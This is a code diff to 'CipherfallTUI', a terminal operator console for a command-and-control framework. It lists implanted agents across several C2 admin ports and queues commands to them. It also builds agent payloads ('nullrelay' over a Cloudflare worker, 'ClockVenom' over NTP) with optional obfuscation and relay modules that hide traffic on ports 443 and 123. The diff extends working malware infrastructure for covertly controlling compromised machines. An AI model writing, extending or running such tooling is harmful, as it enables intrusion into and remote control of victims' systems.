@@ -32,9 +32,12 @@ import httpx
 
 load_dotenv()
 
-BASE         = f"http://127.0.0.1:{os.environ.get('C2_ADMIN_PORT', '1337')}"
+_ports       = os.environ.get("C2_ADMIN_PORTS",
+                   os.environ.get("C2_ADMIN_PORT", "1338,1337")).split(",")
+BASES        = [f"http://127.0.0.1:{p.strip()}" for p in _ports if p.strip()]
+BASE         = BASES[0]
 _DEFAULT_URL = os.environ.get("WORKER_URL", "").rstrip("/")
-_C2_HOST     = os.environ.get("C2_HOST", "127.0.0.1")
+_C2_HOST     = os.environ.get("C2_HOST", "0.0.0.0")
 _DEFAULT_PSK = os.environ.get("C2_PSK", "")
 TASK_COLORS  = {"done": "green", "sent": "yellow", "pending": "red"}
 HERE         = pathlib.Path(__file__).parent
@@ -71,7 +74,8 @@ def _patch_agent(src: str, psk: str, interval: int, jitter: int) -> str:
 
 
 def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
-                            jitter: int, out_name: str) -> pathlib.Path:
+                            jitter: int, out_name: str,
+                            relay_port: int = 0) -> pathlib.Path:
     src = (HERE / "cloudflare-worker" / "nullrelay.py").read_text(encoding="utf-8")
     src = re.sub(
         r'WORKER_URL\s*=\s*os\.environ\.get\([^)]+\)',
@@ -93,6 +97,12 @@ def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
         f'JITTER     = int(os.environ.get("C2_JITTER", "{jitter}"))',
         src,
     )
+    if relay_port:
+        src = re.sub(
+            r'RELAY_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
+            f'RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "{relay_port}"))',
+            src,
+        )
     out = HERE / out_name
     out.write_text(src, encoding="utf-8")
     return out
@@ -165,7 +175,7 @@ def _build_graph(agents: list, worker_url: str, admin_port: str, c2_host: str = 
     for a in agents:
         info = json.loads(a.get("sysinfo") or "{}")
         bi   = info.get("beacon_int", 30)
-        if now - a["last_seen"] > bi * 5:
+        if now - a["last_seen"] > max(bi * 5, 30):
             dead.append((a, info))
             continue
         rport  = info.get("relay_port", 0)
@@ -327,6 +337,8 @@ class CipherfallTUI(App):
     _selected_task:  str | None = None
     _cmd_history: list[str] = []
     _history_idx: int = -1
+    _agent_base: dict[str, str] = {}   # agent_id -> base URL
+    _agents_data: dict[str, dict] = {}  # agent_id -> agent dict (includes sysinfo)
 
     # ── Layout ───────────────────────────────────────────────────────────────
 
@@ -384,7 +396,7 @@ class CipherfallTUI(App):
                             yield Input(id="p-relay-host", placeholder="192.168.x.x")
                         with Horizontal(classes="form-row", id="row-relay-port"):
                             yield Label("RELAY PORT", classes="form-label")
-                            yield Input(id="p-relay-port", value="123")
+                            yield Input(id="p-relay-port", value="443")
                         with Horizontal(classes="form-row"):
                             yield Label("OBFUSCATION", classes="form-label")
                             yield Switch(id="p-obf", value=True)
@@ -405,8 +417,8 @@ class CipherfallTUI(App):
         self.query_one("#tasks-table", DataTable).add_columns(
             "ID", "Command", "Status", "Time"
         )
-        # relay rows only relevant for NTP; default agent type is cloudflare
-        self.query_one("#row-relay").display      = False
+        # relay switch shown for all agent types; host row only for NTP
+        self.query_one("#row-relay").display      = True
         self.query_one("#row-relay-host").display = False
         self.query_one("#row-relay-port").display = False
         await self._load_agents()
@@ -415,15 +427,28 @@ class CipherfallTUI(App):
     # ── Data ─────────────────────────────────────────────────────────────────
 
     async def _load_agents(self) -> None:
-        try:
-            async with httpx.AsyncClient() as c:
-                ag_r  = await c.get(f"{BASE}/admin/agents", timeout=3)
-                tsk_r = await c.get(f"{BASE}/admin/tasks",  timeout=3)
-        except Exception:
+        agents_by_id: dict[str, tuple] = {}   # id -> (agent, base)
+        all_tasks: list = []
+
+        async with httpx.AsyncClient() as c:
+            for base in BASES:
+                try:
+                    ag_r  = await c.get(f"{base}/admin/agents", timeout=3)
+                    tsk_r = await c.get(f"{base}/admin/tasks",  timeout=3)
+                    for a in ag_r.json():
+                        prev = agents_by_id.get(a["id"])
+                        if not prev or a["last_seen"] > prev[0]["last_seen"]:
+                            agents_by_id[a["id"]] = (a, base)
+                    all_tasks.extend(tsk_r.json())
+                except Exception:
+                    pass
+
+        if not agents_by_id:
             return
 
-        agents    = ag_r.json()
-        all_tasks = tsk_r.json()
+        self._agent_base  = {aid: base for aid, (_, base) in agents_by_id.items()}
+        self._agents_data = {aid: a    for aid, (a, _)    in agents_by_id.items()}
+        agents = [a for a, _ in agents_by_id.values()]
 
         pending: dict[str, int] = {}
         for task in all_tasks:
@@ -434,7 +459,8 @@ class CipherfallTUI(App):
         t.clear()
         for a in agents:
             info  = json.loads(a.get("sysinfo") or "{}")
-            alive = int(time.time()) - a["last_seen"] < 120
+            bi    = json.loads(a.get("sysinfo") or "{}").get("beacon_int", 30)
+            alive = int(time.time()) - a["last_seen"] < max(bi * 5, 30)
             n     = pending.get(a["id"], 0)
             t.add_row(
                 Text("●", style="green" if alive else "red"),
@@ -455,9 +481,10 @@ class CipherfallTUI(App):
             await self._load_tasks(self._selected_agent)
 
     async def _load_tasks(self, agent_id: str) -> None:
+        base = self._agent_base.get(agent_id, BASE)
         try:
             async with httpx.AsyncClient() as c:
-                r = await c.get(f"{BASE}/admin/tasks", timeout=3)
+                r = await c.get(f"{base}/admin/tasks", timeout=3)
                 tasks = [t for t in r.json() if t["agent_id"] == agent_id]
         except Exception:
             return
@@ -478,9 +505,10 @@ class CipherfallTUI(App):
             await self._show_output(self._selected_task)
 
     async def _show_output(self, task_id: str) -> None:
+        base = self._agent_base.get(self._selected_agent or "", BASE)
         try:
             async with httpx.AsyncClient() as c:
-                r = await c.get(f"{BASE}/admin/result/{task_id}", timeout=3)
+                r = await c.get(f"{base}/admin/result/{task_id}", timeout=3)
                 task = r.json()
         except Exception:
             return
@@ -542,17 +570,28 @@ class CipherfallTUI(App):
                 self._cmd_history.pop()
         self._history_idx = -1
         if cmd.startswith("/module relay"):
-            parts = cmd.split()
-            # /module relay [start [port [target]]]
-            if len(parts) <= 2 or (len(parts) == 3 and parts[2] == "start"):
-                port = "123"
-                cmd  = f"/module relay start {port} {_C2_HOST}:443"
-            elif len(parts) == 4 and parts[2] == "start":
-                cmd  = f"/module relay start {parts[3]} {_C2_HOST}:443"
+            parts  = cmd.split()
+            a_data = self._agents_data.get(self._selected_agent or "", {})
+            info   = json.loads(a_data.get("sysinfo") or "{}")
+            wurl   = info.get("worker_url", "")
+            is_nr  = not wurl.startswith("ntp://")  # NullRelay uses HTTPS worker URL
+            if is_nr:
+                # NullRelay: /module relay start [port] — no target needed
+                if len(parts) <= 2 or (len(parts) == 3 and parts[2] == "start"):
+                    cmd = "/module relay start 443"
+                elif len(parts) == 4 and parts[2] == "start":
+                    cmd = f"/module relay start {parts[3]}"
+            else:
+                # ClockVenom NTP: /module relay start [port] [host:port]
+                if len(parts) <= 2 or (len(parts) == 3 and parts[2] == "start"):
+                    cmd = f"/module relay start 123 {_C2_HOST}:443"
+                elif len(parts) == 4 and parts[2] == "start":
+                    cmd = f"/module relay start {parts[3]} {_C2_HOST}:443"
+        base = self._agent_base.get(self._selected_agent or "", BASE)
         try:
             async with httpx.AsyncClient() as c:
                 r = await c.post(
-                    f"{BASE}/admin/task",
+                    f"{base}/admin/task",
                     json={"agent_id": self._selected_agent, "command": cmd},
                     timeout=3,
                 )
@@ -561,6 +600,7 @@ class CipherfallTUI(App):
             self.query_one("#output-log", RichLog).write(f"[red]error: {e}[/red]")
             return
 
+        self._selected_task = result["task_id"]
         log = self.query_one("#output-log", RichLog)
         log.clear()
         log.write(f"[yellow]queued  →  task {result['task_id'][:8]}[/yellow]")
@@ -570,16 +610,17 @@ class CipherfallTUI(App):
         if event.select.id != "p-type":
             return
         is_cf = event.value == "cloudflare"
-        self.query_one("#row-url").display = is_cf
         is_relay_on = self.query_one("#p-relay", Switch).value
-        self.query_one("#row-relay").display      = not is_cf
+        self.query_one("#row-url").display        = is_cf
+        self.query_one("#row-relay").display      = True
         self.query_one("#row-relay-host").display = not is_cf and is_relay_on
-        self.query_one("#row-relay-port").display = not is_cf and is_relay_on
+        self.query_one("#row-relay-port").display = is_relay_on
 
     def on_switch_changed(self, event: Switch.Changed) -> None:
         if event.switch.id != "p-relay":
             return
-        self.query_one("#row-relay-host").display = event.value
+        is_cf = self.query_one("#p-type", Select).value == "cloudflare"
+        self.query_one("#row-relay-host").display = event.value and not is_cf
         self.query_one("#row-relay-port").display = event.value
 
     async def on_button_pressed(self, event: Button.Pressed) -> None:
@@ -609,11 +650,17 @@ class CipherfallTUI(App):
                 )
             else:
                 out = await asyncio.to_thread(
-                    _bake_agent_cloudflare, worker_url, psk, interval, jitter, out_name
+                    _bake_agent_cloudflare, worker_url, psk, interval, jitter, out_name,
+                    relay_port if relay_mode else 0,
                 )
             if obfuscate:
                 out = await asyncio.to_thread(_obfuscate, out)
-            relay_tag = f" [via {relay_host}:{relay_port}]" if (agent_type == "ntp" and relay_mode) else ""
+            if agent_type == "ntp" and relay_mode:
+                relay_tag = f" [via {relay_host}:{relay_port}]"
+            elif agent_type == "cloudflare" and relay_mode:
+                relay_tag = f" [relay :{relay_port}]"
+            else:
+                relay_tag = ""
             status.update(f"[green]✓  {agent_type} agent{relay_tag} → {out.name}[/green]")
         except Exception as e:
             status.update(f"[red]error: {e}[/red]")
